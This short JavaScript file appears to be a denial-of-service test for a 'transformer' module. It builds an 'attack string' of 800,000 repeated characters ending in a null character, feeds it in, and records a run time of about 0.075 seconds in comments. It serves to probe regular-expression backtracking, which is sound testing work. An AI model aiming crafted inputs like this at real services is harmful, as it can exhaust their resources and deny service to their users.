import transformer from "./root-ref.js";

//Attack String :""+"aaaaaaaa"*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "aaaaaaaa";
}
str += "\u0000";

const file = {
  source: str,
};

var result = transformer(file);

// real    0m0.075s
// user    0m0.053s
// sys     0m0.011s
